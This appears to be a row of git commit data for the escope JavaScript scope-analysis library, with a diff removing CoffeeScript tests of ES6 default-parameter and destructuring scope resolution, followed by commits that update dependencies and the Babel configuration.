FunctionDeclaration: """"""<\n>-                let a;<\n>-                function foo(b = a) {}<\n>-            """"""<\n>-            FunctionExpression: """"""<\n>-                let a;<\n>-                let foo = function(b = a) {}<\n>-            """"""<\n>-            ArrowExpression: """"""<\n>-                let a;<\n>-                let foo = (b = a) => {};<\n>-            """"""<\n>-        for name<c> code of patterns then do (name<c> code) -><\n>-            it name<c> -><\n>-                numVars = if name == 'ArrowExpression' then 1 else 2<\n>-                ast = espree code<\n>-                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-                scope = scopeManager.scopes[1]<\n>-                expect(scope.variables).to.have.length numVars  # [arguments?<c> b]<\n>-                expect(scope.references).to.have.length 2  # [b<c> a]<\n>-                reference = scope.references[1]<\n>-                expect(reference.from).to.equal scope<\n>-                expect(reference.identifier.name).to.equal 'a'<\n>-                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-                expect(reference.writeExpr).to.be.undefined<\n>-                expect(reference.isWrite()).to.be.false<\n>-                expect(reference.isRead()).to.be.true<\n>-    describe 'a default parameter creates a readable reference for references in right (for const):'<c> -><\n>-        patterns =<\n>-            FunctionDeclaration: """"""<\n>-                const a = 0;<\n>-                function foo(b = a) {}<\n>-            """"""<\n>-            FunctionExpression: """"""<\n>-                const a = 0;<\n>-                let foo = function(b = a) {}<\n>-            """"""<\n>-            ArrowExpression: """"""<\n>-                const a = 0;<\n>-                let foo = (b = a) => {};<\n>-            """"""<\n>-        for name<c> code of patterns then do (name<c> code) -><\n>-            it name<c> -><\n>-                numVars = if name == 'ArrowExpression' then 1 else 2<\n>-                ast = espree code<\n>-                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-                scope = scopeManager.scopes[1]<\n>-                expect(scope.variables).to.have.length numVars  # [arguments?<c> b]<\n>-                expect(scope.references).to.have.length 2  # [b<c> a]<\n>-                reference = scope.references[1]<\n>-                expect(reference.from).to.equal scope<\n>-                expect(reference.identifier.name).to.equal 'a'<\n>-                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-                expect(reference.writeExpr).to.be.undefined<\n>-                expect(reference.isWrite()).to.be.false<\n>-                expect(reference.isRead()).to.be.true<\n>-    describe 'a default parameter creates a readable reference for references in right (partial):'<c> -><\n>-        patterns =<\n>-            FunctionDeclaration: """"""<\n>-                let a;<\n>-                function foo(b = a.c) {}<\n>-            """"""<\n>-            FunctionExpression: """"""<\n>-                let a;<\n>-                let foo = function(b = a.c) {}<\n>-            """"""<\n>-            ArrowExpression: """"""<\n>-                let a;<\n>-                let foo = (b = a.c) => {};<\n>-            """"""<\n>-        for name<c> code of patterns then do (name<c> code) -><\n>-            it name<c> -><\n>-                numVars = if name == 'ArrowExpression' then 1 else 2<\n>-                ast = espree code<\n>-                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-                expect(scopeManager.scopes).to.have.length 2  # [global<c> foo]<\n>-                scope = scopeManager.scopes[1]<\n>-                expect(scope.variables).to.have.length numVars  # [arguments?<c> b]<\n>-                expect(scope.references).to.have.length 2  # [b<c> a]<\n>-                reference = scope.references[1]<\n>-                expect(reference.from).to.equal scope<\n>-                expect(reference.identifier.name).to.equal 'a'<\n>-                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-                expect(reference.writeExpr).to.be.undefined<\n>-                expect(reference.isWrite()).to.be.false<\n>-                expect(reference.isRead()).to.be.true<\n>-    describe 'a default parameter creates a readable reference for references in right\'s nested scope:'<c> -><\n>-        patterns =<\n>-            FunctionDeclaration: """"""<\n>-                let a;<\n>-                function foo(b = function() { return a; }) {}<\n>-            """"""<\n>-            FunctionExpression: """"""<\n>-                let a;<\n>-                let foo = function(b = function() { return a; }) {}<\n>-            """"""<\n>-            ArrowExpression: """"""<\n>-                let a;<\n>-                let foo = (b = function() { return a; }) => {};<\n>-            """"""<\n>-        for name<c> code of patterns then do (name<c> code) -><\n>-            it name<c> -><\n>-                ast = espree code<\n>-                scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-                expect(scopeManager.scopes).to.have.length 3  # [global<c> foo<c> anonymous]<\n>-                scope = scopeManager.scopes[2]<\n>-                expect(scope.variables).to.have.length 1  # [arguments]<\n>-                expect(scope.references).to.have.length 1  # [a]<\n>-                reference = scope.references[0]<\n>-                expect(reference.from).to.equal scope<\n>-                expect(reference.identifier.name).to.equal 'a'<\n>-                expect(reference.resolved).to.equal scopeManager.scopes[0].variables[0]<\n>-                expect(reference.writeExpr).to.be.undefined<\n>-                expect(reference.isWrite()).to.be.false<\n>-                expect(reference.isRead()).to.be.true<\n>-# vim: set sw=4 ts=4 et tw=80 :<\n>-# -*- coding: utf-8 -*-<\n>-#  Copyright (C) 2014 Yusuke Suzuki <utatane.tea@gmail.com><\n>-#<\n>-#  Redistribution and use in source and binary forms<c> with or without<\n>-#  modification<c> are permitted provided that the following conditions are met:<\n>-#<\n>-#    * Redistributions of source code must retain the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer.<\n>-#    * Redistributions in binary form must reproduce the above copyright<\n>-#      notice<c> this list of conditions and the following disclaimer in the<\n>-#      documentation and/or other materials provided with the distribution.<\n>-#<\n>-#  THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS ""AS IS""<\n>-#  AND ANY EXPRESS OR IMPLIED WARRANTIES<c> INCLUDING<c> BUT NOT LIMITED TO<c> THE<\n>-#  IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE<\n>-#  ARE DISCLAIMED. IN NO EVENT SHALL <COPYRIGHT HOLDER> BE LIABLE FOR ANY<\n>-#  DIRECT<c> INDIRECT<c> INCIDENTAL<c> SPECIAL<c> EXEMPLARY<c> OR CONSEQUENTIAL DAMAGES<\n>-#  (INCLUDING<c> BUT NOT LIMITED TO<c> PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES;<\n>-#  LOSS OF USE<c> DATA<c> OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND<\n>-#  ON ANY THEORY OF LIABILITY<c> WHETHER IN CONTRACT<c> STRICT LIABILITY<c> OR TORT<\n>-#  (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF<\n>-#  THIS SOFTWARE<c> EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.<\n>-expect = require('chai').expect<\n>-harmony = require '../third_party/esprima'<\n>-espree = require '../third_party/espree'<\n>-escope = require '..'<\n>-describe 'ES6 destructuring assignments'<c> -><\n>-    it 'Pattern in var in ForInStatement'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (function () {<\n>-            for (var [a<c> b<c> c] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 1<\n>-        expect(scope.implicit.left[0].identifier.name).to.be.equal 'array'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.be.equal 'function'<\n>-        expect(scope.variables).to.have.length 4<\n>-        expect(scope.variables[0].name).to.be.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.be.equal 'a'<\n>-        expect(scope.variables[2].name).to.be.equal 'b'<\n>-        expect(scope.variables[3].name).to.be.equal 'c'<\n>-        expect(scope.references).to.have.length 4<\n>-        expect(scope.references[0].identifier.name).to.be.equal 'a'<\n>-        expect(scope.references[0].isWrite()).to.be.true<\n>-        expect(scope.references[0].partial).to.be.true<\n>-        expect(scope.references[0].resolved).to.be.equal scope.variables[1]<\n>-        expect(scope.references[1].identifier.name).to.be.equal 'b'<\n>-        expect(scope.references[1].isWrite()).to.be.true<\n>-        expect(scope.references[1].partial).to.be.true<\n>-        expect(scope.references[1].resolved).to.be.equal scope.variables[2]<\n>-        expect(scope.references[2].identifier.name).to.be.equal 'c'<\n>-        expect(scope.references[2].isWrite()).to.be.true<\n>-        expect(scope.references[2].partial).to.be.true<\n>-        expect(scope.references[2].resolved).to.be.equal scope.variables[3]<\n>-        expect(scope.references[3].identifier.name).to.be.equal 'array'<\n>-        expect(scope.references[3].isWrite()).to.be.false<\n>-    it 'Pattern in let in ForInStatement'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (function () {<\n>-            for (let [a<c> b<c> c] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 4  # [global<c> function<c> TDZ<c> for]<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 1<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal 'array'<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.equal 'TDZ'<\n>-        expect(scope.variables).to.have.length 3<\n>-        expect(scope.variables[0].name).to.equal 'a'<\n>-        expect(scope.variables[1].name).to.equal 'b'<\n>-        expect(scope.variables[2].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].identifier.name).to.equal 'array'<\n>-        expect(scope.references[0].isWrite()).to.be.false<\n>-        scope = scopeManager.scopes[3]<\n>-        expect(scope.type).to.equal 'for'<\n>-        expect(scope.variables).to.have.length 3<\n>-        expect(scope.variables[0].name).to.equal 'a'<\n>-        expect(scope.variables[1].name).to.equal 'b'<\n>-        expect(scope.variables[2].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 3<\n>-        expect(scope.references[0].identifier.name).to.equal 'a'<\n>-        expect(scope.references[0].isWrite()).to.be.true<\n>-        expect(scope.references[0].partial).to.be.true<\n>-        expect(scope.references[0].resolved).to.equal scope.variables[0]<\n>-        expect(scope.references[1].identifier.name).to.equal 'b'<\n>-        expect(scope.references[1].isWrite()).to.be.true<\n>-        expect(scope.references[1].partial).to.be.true<\n>-        expect(scope.references[1].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[2].identifier.name).to.equal 'c'<\n>-        expect(scope.references[2].isWrite()).to.be.true<\n>-        expect(scope.references[2].partial).to.be.true<\n>-        expect(scope.references[2].resolved).to.equal scope.variables[2]<\n>-    it 'Pattern with default values in var in ForInStatement'<c> -><\n>-        ast = espree """"""<\n>-        (function () {<\n>-            for (var [a<c> b<c> c = d] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 2<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal 'array'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.equal 'function'<\n>-        expect(scope.variables).to.have.length 4<\n>-        expect(scope.variables[0].name).to.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.equal 'a'<\n>-        expect(scope.variables[2].name).to.equal 'b'<\n>-        expect(scope.variables[3].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 6<\n>-        expect(scope.references[0].identifier.name).to.equal 'c'<\n>-        expect(scope.references[0].isWrite()).to.be.true<\n>-        expect(scope.references[0].writeExpr.name).to.equal 'd'<\n>-        expect(scope.references[0].partial).to.be.false<\n>-        expect(scope.references[0].resolved).to.equal scope.variables[3]<\n>-        expect(scope.references[1].identifier.name).to.equal 'd'<\n>-        expect(scope.references[1].isWrite()).to.be.false<\n>-        expect(scope.references[2].identifier.name).to.equal 'a'<\n>-        expect(scope.references[2].isWrite()).to.be.true<\n>-        expect(scope.references[2].partial).to.be.true<\n>-        expect(scope.references[2].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[3].identifier.name).to.equal 'b'<\n>-        expect(scope.references[3].isWrite()).to.be.true<\n>-        expect(scope.references[3].partial).to.be.true<\n>-        expect(scope.references[3].resolved).to.equal scope.variables[2]<\n>-        expect(scope.references[4].identifier.name).to.equal 'c'<\n>-        expect(scope.references[4].isWrite()).to.be.true<\n>-        expect(scope.references[4].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[4].partial).to.be.true<\n>-        expect(scope.references[4].resolved).to.equal scope.variables[3]<\n>-        expect(scope.references[5].identifier.name).to.equal 'array'<\n>-        expect(scope.references[5].isWrite()).to.be.false<\n>-    it 'Pattern with default values in let in ForInStatement'<c> -><\n>-        ast = espree """"""<\n>-        (function () {<\n>-            for (let [a<c> b<c> c = d] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 4  # [global<c> function<c> TDZ<c> for]<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 2<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal 'array'<\n>-        expect(scope.implicit.left[0].from.type).to.equal 'TDZ'<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal 'd'<\n>-        expect(scope.implicit.left[1].from.type).to.equal 'for'<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.equal 'TDZ'<\n>-        expect(scope.variables).to.have.length 3<\n>-        expect(scope.variables[0].name).to.equal 'a'<\n>-        expect(scope.variables[1].name).to.equal 'b'<\n>-        expect(scope.variables[2].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].identifier.name).to.equal 'array'<\n>-        expect(scope.references[0].isWrite()).to.be.false<\n>-        scope = scopeManager.scopes[3]<\n>-        expect(scope.type).to.equal 'for'<\n>-        expect(scope.variables).to.have.length 3<\n>-        expect(scope.variables[0].name).to.equal 'a'<\n>-        expect(scope.variables[1].name).to.equal 'b'<\n>-        expect(scope.variables[2].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 5<\n>-        expect(scope.references[0].identifier.name).to.equal 'c'<\n>-        expect(scope.references[0].isWrite()).to.be.true<\n>-        expect(scope.references[0].writeExpr.name).to.equal 'd'<\n>-        expect(scope.references[0].partial).to.be.false<\n>-        expect(scope.references[0].resolved).to.equal scope.variables[2]<\n>-        expect(scope.references[1].identifier.name).to.equal 'd'<\n>-        expect(scope.references[1].isWrite()).to.be.false<\n>-        expect(scope.references[2].identifier.name).to.equal 'a'<\n>-        expect(scope.references[2].isWrite()).to.be.true<\n>-        expect(scope.references[2].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[2].partial).to.be.true<\n>-        expect(scope.references[2].resolved).to.equal scope.variables[0]<\n>-        expect(scope.references[3].identifier.name).to.equal 'b'<\n>-        expect(scope.references[3].isWrite()).to.be.true<\n>-        expect(scope.references[3].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[3].partial).to.be.true<\n>-        expect(scope.references[3].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[4].identifier.name).to.equal 'c'<\n>-        expect(scope.references[4].isWrite()).to.be.true<\n>-        expect(scope.references[4].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[4].partial).to.be.true<\n>-        expect(scope.references[4].resolved).to.equal scope.variables[2]<\n>-    it 'Pattern with nested default values in var in ForInStatement'<c> -><\n>-        ast = espree """"""<\n>-        (function () {<\n>-            for (var [a<c> [b<c> c = d] = e] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 3<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal 'e'<\n>-        expect(scope.implicit.left[2].identifier.name).to.equal 'array'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.equal 'function'<\n>-        expect(scope.variables).to.have.length 4<\n>-        expect(scope.variables[0].name).to.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.equal 'a'<\n>-        expect(scope.variables[2].name).to.equal 'b'<\n>-        expect(scope.variables[3].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 9<\n>-        expect(scope.references[0].identifier.name).to.equal 'b'<\n>-        expect(scope.references[0].isWrite()).to.be.true<\n>-        expect(scope.references[0].writeExpr.name).to.equal 'e'<\n>-        expect(scope.references[0].partial).to.be.true<\n>-        expect(scope.references[0].resolved).to.equal scope.variables[2]<\n>-        expect(scope.references[1].identifier.name).to.equal 'c'<\n>-        expect(scope.references[1].isWrite()).to.be.true<\n>-        expect(scope.references[1].writeExpr.name).to.equal 'e'<\n>-        expect(scope.references[1].partial).to.be.true<\n>-        expect(scope.references[1].resolved).to.equal scope.variables[3]<\n>-        expect(scope.references[2].identifier.name).to.equal 'c'<\n>-        expect(scope.references[2].isWrite()).to.be.true<\n>-        expect(scope.references[2].writeExpr.name).to.equal 'd'<\n>-        expect(scope.references[2].partial).to.be.false<\n>-        expect(scope.references[2].resolved).to.equal scope.variables[3]<\n>-        expect(scope.references[3].identifier.name).to.equal 'd'<\n>-        expect(scope.references[3].isWrite()).to.be.false<\n>-        expect(scope.references[4].identifier.name).to.equal 'e'<\n>-        expect(scope.references[4].isWrite()).to.be.false<\n>-        expect(scope.references[5].identifier.name).to.equal 'a'<\n>-        expect(scope.references[5].isWrite()).to.be.true<\n>-        expect(scope.references[5].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[5].partial).to.be.true<\n>-        expect(scope.references[5].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[6].identifier.name).to.equal 'b'<\n>-        expect(scope.references[6].isWrite()).to.be.true<\n>-        expect(scope.references[6].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[6].partial).to.be.true<\n>-        expect(scope.references[6].resolved).to.equal scope.variables[2]<\n>-        expect(scope.references[7].identifier.name).to.equal 'c'<\n>-        expect(scope.references[7].isWrite()).to.be.true<\n>-        expect(scope.references[7].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[7].partial).to.be.true<\n>-        expect(scope.references[7].resolved).to.equal scope.variables[3]<\n>-        expect(scope.references[8].identifier.name).to.equal 'array'<\n>-        expect(scope.references[8].isWrite()).to.be.false<\n>-    it 'Pattern with nested default values in let in ForInStatement'<c> -><\n>-        ast = espree """"""<\n>-        (function () {<\n>-            for (let [a<c> [b<c> c = d] = e] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 4  # [global<c> function<c> TDZ<c> for]<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 3<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal 'array'<\n>-        expect(scope.implicit.left[0].from.type).to.equal 'TDZ'<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal 'd'<\n>-        expect(scope.implicit.left[1].from.type).to.equal 'for'<\n>-        expect(scope.implicit.left[2].identifier.name).to.equal 'e'<\n>-        expect(scope.implicit.left[2].from.type).to.equal 'for'<\n>-        scope = scopeManager.scopes[2]<\n>-        expect(scope.type).to.equal 'TDZ'<\n>-        expect(scope.variables).to.have.length 3<\n>-        expect(scope.variables[0].name).to.equal 'a'<\n>-        expect(scope.variables[1].name).to.equal 'b'<\n>-        expect(scope.variables[2].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 1<\n>-        expect(scope.references[0].identifier.name).to.equal 'array'<\n>-        expect(scope.references[0].isWrite()).to.be.false<\n>-        scope = scopeManager.scopes[3]<\n>-        expect(scope.type).to.equal 'for'<\n>-        expect(scope.variables).to.have.length 3<\n>-        expect(scope.variables[0].name).to.equal 'a'<\n>-        expect(scope.variables[1].name).to.equal 'b'<\n>-        expect(scope.variables[2].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 8<\n>-        expect(scope.references[0].identifier.name).to.equal 'b'<\n>-        expect(scope.references[0].isWrite()).to.be.true<\n>-        expect(scope.references[0].writeExpr.name).to.equal 'e'<\n>-        expect(scope.references[0].partial).to.be.true<\n>-        expect(scope.references[0].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[1].identifier.name).to.equal 'c'<\n>-        expect(scope.references[1].isWrite()).to.be.true<\n>-        expect(scope.references[1].writeExpr.name).to.equal 'e'<\n>-        expect(scope.references[1].partial).to.be.true<\n>-        expect(scope.references[1].resolved).to.equal scope.variables[2]<\n>-        expect(scope.references[2].identifier.name).to.equal 'c'<\n>-        expect(scope.references[2].isWrite()).to.be.true<\n>-        expect(scope.references[2].writeExpr.name).to.equal 'd'<\n>-        expect(scope.references[2].partial).to.be.false<\n>-        expect(scope.references[2].resolved).to.equal scope.variables[2]<\n>-        expect(scope.references[3].identifier.name).to.equal 'd'<\n>-        expect(scope.references[3].isWrite()).to.be.false<\n>-        expect(scope.references[4].identifier.name).to.equal 'e'<\n>-        expect(scope.references[4].isWrite()).to.be.false<\n>-        expect(scope.references[5].identifier.name).to.equal 'a'<\n>-        expect(scope.references[5].isWrite()).to.be.true<\n>-        expect(scope.references[5].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[5].partial).to.be.true<\n>-        expect(scope.references[5].resolved).to.equal scope.variables[0]<\n>-        expect(scope.references[6].identifier.name).to.equal 'b'<\n>-        expect(scope.references[6].isWrite()).to.be.true<\n>-        expect(scope.references[6].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[6].partial).to.be.true<\n>-        expect(scope.references[6].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[7].identifier.name).to.equal 'c'<\n>-        expect(scope.references[7].isWrite()).to.be.true<\n>-        expect(scope.references[7].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[7].partial).to.be.true<\n>-        expect(scope.references[7].resolved).to.equal scope.variables[2]<\n>-    it 'Pattern with default values in var in ForInStatement (separate declarations)'<c> -><\n>-        ast = espree """"""<\n>-        (function () {<\n>-            var a<c> b<c> c;<\n>-            for ([a<c> b<c> c = d] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 2<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal 'array'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.equal 'function'<\n>-        expect(scope.variables).to.have.length 4<\n>-        expect(scope.variables[0].name).to.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.equal 'a'<\n>-        expect(scope.variables[2].name).to.equal 'b'<\n>-        expect(scope.variables[3].name).to.equal 'c'<\n>-        expect(scope.references).to.have.length 6<\n>-        expect(scope.references[0].identifier.name).to.equal 'a'<\n>-        expect(scope.references[0].isWrite()).to.be.true<\n>-        expect(scope.references[0].partial).to.be.true<\n>-        expect(scope.references[0].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[1].identifier.name).to.equal 'b'<\n>-        expect(scope.references[1].isWrite()).to.be.true<\n>-        expect(scope.references[1].partial).to.be.true<\n>-        expect(scope.references[1].resolved).to.equal scope.variables[2]<\n>-        expect(scope.references[2].identifier.name).to.equal 'c'<\n>-        expect(scope.references[2].isWrite()).to.be.true<\n>-        expect(scope.references[2].writeExpr.name).to.equal 'd'<\n>-        expect(scope.references[2].partial).to.be.false<\n>-        expect(scope.references[2].resolved).to.equal scope.variables[3]<\n>-        expect(scope.references[3].identifier.name).to.equal 'c'<\n>-        expect(scope.references[3].isWrite()).to.be.true<\n>-        expect(scope.references[3].writeExpr.name).to.equal 'array'<\n>-        expect(scope.references[3].partial).to.be.true<\n>-        expect(scope.references[3].resolved).to.equal scope.variables[3]<\n>-        expect(scope.references[4].identifier.name).to.equal 'd'<\n>-        expect(scope.references[4].isWrite()).to.be.false<\n>-        expect(scope.references[5].identifier.name).to.equal 'array'<\n>-        expect(scope.references[5].isWrite()).to.be.false<\n>-    it 'Pattern with default values in var in ForInStatement (separate declarations and with MemberExpression)'<c> -><\n>-        ast = espree """"""<\n>-        (function () {<\n>-            var obj;<\n>-            for ([obj.a<c> obj.b<c> obj.c = d] in array);<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expect(scope.references).to.have.length 0<\n>-        expect(scope.implicit.left).to.have.length 2<\n>-        expect(scope.implicit.left[0].identifier.name).to.equal 'd'<\n>-        expect(scope.implicit.left[1].identifier.name).to.equal 'array'<\n>-        scope = scopeManager.scopes[1]<\n>-        expect(scope.type).to.equal 'function'<\n>-        expect(scope.variables).to.have.length 2<\n>-        expect(scope.variables[0].name).to.equal 'arguments'<\n>-        expect(scope.variables[1].name).to.equal 'obj'<\n>-        expect(scope.references).to.have.length 5<\n>-        expect(scope.references[0].identifier.name).to.equal 'obj'  # obj.a<\n>-        expect(scope.references[0].isWrite()).to.be.false<\n>-        expect(scope.references[0].isRead()).to.be.true<\n>-        expect(scope.references[0].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[1].identifier.name).to.equal 'obj'  # obj.b<\n>-        expect(scope.references[1].isWrite()).to.be.false<\n>-        expect(scope.references[1].isRead()).to.be.true<\n>-        expect(scope.references[1].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[2].identifier.name).to.equal 'obj'  # obj.c<\n>-        expect(scope.references[2].isWrite()).to.be.false<\n>-        expect(scope.references[2].isRead()).to.be.true<\n>-        expect(scope.references[2].resolved).to.equal scope.variables[1]<\n>-        expect(scope.references[3].identifier.name).to.equal 'd'<\n>-        expect(scope.references[3].isWrite()).to.be.false<\n>-        expect(scope.references[3].isRead()).to.be.true<\n>-        expect(scope.references[4].identifier.name).to.equal 'array'<\n>-        expect(scope.references[4].isWrite()).to.be.false<\n>-        expect(scope.references[4].isRead()).to.be.true<\n>-    it 'ArrayPattern in var'<c> -><\n>-        ast = harmony.parse """"""<\n>-        (function () {<\n>-            var [a<c> b<c> c] = array;<\n>-        }());<\n>-        """"""<\n>-        scopeManager = escope.analyze ast<c> ecmaVersion: 6<\n>-        expect(scopeManager.scopes).to.have.length 2<\n>-        scope = scopeManager.scopes[0]<\n>-        globalScope = scope<\n>-        expect(scope.type).to.be.equal 'global'<\n>-        expect(scope.variables).to.have.length 0<\n>-        expec",F
17,56,56,569,4,26,Brian Donovan,269,56,201,10,User,1,4177,Tue,12,45,12 Jan 2016,Move babel config into .babelrc.,0,1,1,7,308,"+  ""presets"": [""es2015""]<\n>+    coffee = require('coffee-script/register')<c><\n>+    fs = require('fs');<\n>+var BABEL_OPTIONS = JSON.parse(fs.readFileSync('.babelrc'<c> { encoding: 'utf8' }));<\n>+    .pipe(babel<c> BABEL_OPTIONS)<\n>",-    coffee = require('coffee-script/register');<\n>-    .pipe(babel<c> { presets: ['es2015'] })<\n>,F
17,56,56,569,4,26,Michael Ficarra,144,80,823,153,User,1,3432,Mon,9,40,11 Jan 2016,Merge pull request #94 from eventualbuddha/update-dependencies Update all dependencies.,0,0,0,0,0,,,F
17,56,56,569,4,26,Brian Donovan,269,56,201,10,User,1,4177,Mon,8,39,11 Jan 2016,Update all dependencies. The dependencies changed are the result of running `ncu -ua` [1]. Babel 6 required explicitly specifying the transforms to run on the code. We use the `es2015` preset to get essentially the same functionality as in Babel 5 (or 4). ESLint updates required changes to the configuration [2]. We use the `es6` env to enable all ES6 features except for modules and the `modules` setting to enable modules. [1]: https://www.npmjs.com/package/npm-check-updates [2]: http://eslint.org/docs/user-guide/configuring,0,0,2,36,958,"+        'no-multi-spaces': 0<c><\n>+    ecmaFeatures: {<\n>+        jsx: false<c><\n>+        modules: true<\n>+        node: true<c><\n>+        es6: true<\n>+    .pipe(babel<c> { presets: ['es2015'] })<\n>+    ""es6-map"": ""^0.1.3""<c><\n>+    ""babel"": ""^6.3.26""<c><\n>+    ""babel-preset-es2015"": ""^6.3.13""<c><\n>+    ""browserify"": ""^13.0.0""<c><\n>+    ""chai"": ""^3.4.1""<c><\n>+    ""esprima"": ""^2.7.1""<c><\n>+    ""gulp-babel"": ""^6.1.1""<c><\n>+    ""gulp-eslint"": ""^1.1.1""<c><\n>+    ""gulp-espower"": ""^1.0.2""<c><\n>+    ""gulp-git"": ""^1.6.1""<c><\n>+    